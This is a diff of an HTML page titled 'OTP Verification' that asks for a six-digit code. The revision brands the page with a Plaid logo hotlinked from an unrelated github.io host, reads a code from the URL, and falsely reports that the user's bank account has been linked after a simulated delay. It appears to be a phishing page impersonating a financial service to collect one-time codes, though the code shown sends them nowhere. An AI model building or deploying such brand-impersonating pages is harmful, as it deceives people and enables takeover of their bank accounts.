@@ -5,74 +5,103 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OTP Verification</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            padding: 0;
         }
         
-        .otp-container {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            width: 100%;
-            max-width: 400px;
+        body {
+            background-color: #f7fafc;
+            color: #1a202c;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 420px;
+            margin: 20px auto;
+            padding: 0 20px;
+            position: relative;
+            min-height: 600px;
+        }
+        
+        .logo {
             text-align: center;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 10;
+        }
+        
+        .logo img {
+            height: 60px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            padding: 24px;
+            transition: transform 0.3s ease;
+            position: relative;
+            left: 0;
+            min-height: 400px;
+            margin-top: 60px;
         }
         
         .otp-header {
-            margin-bottom: 20px;
+            text-align: center;
+            margin-bottom: 24px;
         }
         
         .otp-header h1 {
             font-size: 24px;
-            color: #333;
-            margin-bottom: 10px;
+            font-weight: 600;
+            margin-bottom: 8px;
         }
         
         .otp-header p {
-            color: #666;
+            color: #4a5568;
             font-size: 14px;
         }
         
-        .otp-form {
-            margin-top: 20px;
-        }
-        
-        .otp-input {
+        .otp-inputs {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 20px;
+            margin: 20px 0;
         }
         
-        .otp-input input {
+        .otp-inputs input {
             width: 50px;
             height: 50px;
             text-align: center;
             font-size: 20px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            border: 1px solid #e2e8f0;
+            border-radius: 6px;
+        }
+        
+        .otp-inputs input:focus {
+            outline: none;
+            border-color: #000000;
         }
         
         .submit-btn {
+            width: 100%;
             background-color: #000000;
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 12px 20px;
+            border-radius: 6px;
+            padding: 14px;
             font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            width: 100%;
+            transition: background-color 0.2s;
+            margin-top: 20px;
         }
         
         .submit-btn:hover {
-            background-color: #333;
+            background-color: #333333;
         }
         
         .throbber {
@@ -90,35 +119,66 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        .verification-code {
+            background: #f0f4f8;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 500;
+        }
     </style>
 </head>
 <body>
-    <div class="otp-container">
-        <div class="otp-header">
-            <h1>Verify Your Identity</h1>
-            <p>Enter the 6-digit verification code sent to your email</p>
+    <div class="container">
+        <!-- Plaid Logo -->
+        <div class="logo">
+            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Plaid Logo">
         </div>
         
-        <form id="otpForm" class="otp-form">
-            <div class="otp-input">
-                <input type="text" maxlength="1" pattern="[0-9]" required>
-                <input type="text" maxlength="1" pattern="[0-9]" required>
-                <input type="text" maxlength="1" pattern="[0-9]" required>
-                <input type="text" maxlength="1" pattern="[0-9]" required>
-                <input type="text" maxlength="1" pattern="[0-9]" required>
-                <input type="text" maxlength="1" pattern="[0-9]" required>
+        <div class="card">
+            <div class="otp-header">
+                <h1>Verify Your Identity</h1>
+                <p>Enter the 6-digit code sent to your email</p>
             </div>
             
-            <div class="throbber" id="otpThrobber"></div>
+            <div class="verification-code">
+                Verification Code: <span id="verificationCode"></span>
+            </div>
             
-            <button type="submit" class="submit-btn">Verify</button>
-        </form>
+            <form id="otpForm">
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                    <input type="text" maxlength="1" pattern="\d" required>
+                </div>
+                
+                <div class="throbber" id="otpThrobber"></div>
+                
+                <button type="submit" class="submit-btn">Verify</button>
+            </form>
+        </div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Get verification code from URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const verificationCode = urlParams.get('code');
+            
+            if (verificationCode) {
+                document.getElementById('verificationCode').textContent = verificationCode;
+            } else {
+                alert('Invalid verification link');
+                window.location.href = 'index.html';
+            }
+            
             const otpForm = document.getElementById('otpForm');
-            const otpInputs = document.querySelectorAll('.otp-input input');
+            const otpInputs = document.querySelectorAll('.otp-inputs input');
             const otpThrobber = document.getElementById('otpThrobber');
             
             // Auto-focus first input
@@ -135,10 +195,8 @@
                 });
                 
                 input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value.length === 0) {
-                        if (index > 0) {
-                            otpInputs[index - 1].focus();
-                        }
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        otpInputs[index - 1].focus();
                     }
                 });
             });
@@ -147,23 +205,19 @@
             otpForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
+                // Show loading spinner
+                otpThrobber.style.display = 'block';
+                
                 // Combine OTP digits
                 let otp = '';
                 otpInputs.forEach(input => {
                     otp += input.value;
                 });
                 
-                // Show loading spinner
-                otpThrobber.style.display = 'block';
-                
-                // Simulate verification (in a real app, you would send to server)
+                // In a real implementation, you would verify with your server
                 setTimeout(() => {
                     otpThrobber.style.display = 'none';
-                    
-                    // For demo purposes, just show an alert
                     alert('Verification successful! Your bank account has been linked.');
-                    
-                    // In a real implementation, you would redirect to success page
                     // window.location.href = '/success.html';
                 }, 2000);
             });
